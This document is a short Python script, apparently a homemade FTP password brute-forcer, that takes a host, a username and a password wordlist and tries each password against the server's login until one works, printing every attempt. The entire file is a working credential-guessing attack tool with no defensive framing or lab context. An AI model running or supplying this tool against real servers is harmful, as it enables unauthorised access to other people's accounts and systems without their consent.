import ftplib
import sys
from ftplib import FTP

def connectFtp(x,y,z):
    try:
        ftp = FTP(x)
        ftp.login(y,z)
        return True
    except:
        return False

if sys.argv[1].lower()=="-h" or sys.argv[1].lower()=="--help":
    print("Usage : 127.0.0.1 --username/-u username --password/-p wordlist.txt")
    exit()

if len(sys.argv)>6:
    print("ERROR -> Unknown character {}".format(sys.argv[6]))
else:
    if (sys.argv[2].lower()=="--username" or sys.argv[2].lower()=="-u") and (sys.argv[4].lower()=="--password" or sys.argv[4].lower()=="-p"):
        try:
            files = open(sys.argv[5], 'r')
            Lines = files.readlines()
            count = 0
            for line in Lines:
                count += 1
                brute = connectFtp(sys.argv[1],sys.argv[3],line.strip())
                if brute==True:
                    print("Connecting with password '{}' successfull!".format(line.strip()))
                    break
                else:
                    print("Connecting with password '{}' failed!".format(line.strip()))
        except:
            print("Cannot load file '{}'\nMaybe its too large!".format(sys.argv[5]))
    else:
        print("Unknown command! -h or --help for help")